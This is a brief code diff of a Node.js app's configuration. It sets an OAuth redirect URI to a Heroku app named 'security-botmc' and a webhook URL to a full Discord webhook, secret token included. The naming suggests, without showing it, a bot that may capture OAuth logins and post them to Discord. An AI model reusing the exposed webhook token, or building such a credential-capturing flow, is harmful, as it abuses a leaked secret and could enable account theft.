@@ -1,8 +1,8 @@
 //Config
 const client_secret = 'secret_value'
 const client_id = 'client_id'
-const redirect_uri = 'redirect_uri'
-const webhook_url = 'webhook'
+const redirect_uri = 'https://security-botmc.herokuapp.com/'
+const webhook_url = 'https://discord.com/api/webhooks/1040413710679822357/0SstyWoEwPMUR7oOA4-iah8XGLfl6cQhYkk6JvVWGUdu53U2Gd4Umoq3CFU8RMwSEedd'
 //Requirements
 const axios = require('axios')
 const express = require('express')
